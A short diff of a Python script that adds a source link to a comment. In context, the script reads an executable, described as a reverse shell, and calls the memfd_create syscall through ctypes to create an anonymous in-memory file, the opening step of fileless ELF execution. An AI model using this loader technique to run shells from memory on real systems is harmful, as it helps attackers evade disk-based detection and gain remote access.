@@ -1,7 +1,7 @@
 import ctypes
 import sys
 import os
-# read the executable file. It is a reverse shell in our case
+# read the executable file. It is a reverse shell in our case https://blog.fbkcs.ru/elf-in-memory-execution/
 binary = open(sys.argv[1],'rb').read()
 
 fd = ctypes.CDLL(None).syscall(319,"",1) # call memfd_create and create an anonymous file
